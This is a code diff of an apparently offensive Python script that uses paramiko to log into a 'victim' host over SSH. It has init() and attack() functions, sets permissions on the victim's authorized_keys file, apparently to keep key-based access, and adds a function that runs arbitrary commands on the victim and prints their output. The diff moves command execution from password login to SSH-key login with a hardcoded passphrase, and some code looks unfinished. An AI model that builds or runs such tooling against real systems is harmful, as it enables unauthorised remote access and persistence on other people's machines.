@@ -26,7 +26,7 @@ def init():
 
     # Change mode of authorized keys
     command = 'chmod 600 ~/.ssh/authorized_keys'
-    ssh_command_using_name_pw(command)
+    ssh_command_using_ssh_key(command)
 
 
 def attack():
@@ -37,7 +37,7 @@ def attack():
 def ssh_command_using_name_pw(command):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
-    client.connect(victim['ip'], username=victim['name'], password=victim['password'], port=victim['port'], passphrase='12345')
+    client.connect(victim['ip'], username=victim['name'], password=victim['password'], port=victim['port'])
 
     session = client.get_transport().open_session()
 
@@ -53,7 +53,23 @@ def ssh_command_using_name_pw(command):
         print('Session Failed')
 
 
-def ssh_command_using_ssh_key():
+def ssh_command_using_ssh_key(command):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+    client.connect(victim['ip'], port=victim['port'], passphrase='12345')
+
+    session = client.get_transport().open_session()
+
+    if session.active:
+        print('Session Active')
+        session.exec_command(command)
+
+        print('\n--------Victim Std Out--------')
+        print(session.recv(2048))
+        print('--------Victim Std Out--------\n')
+
+    else:
+        print('Session Failed')
     pass
 
 
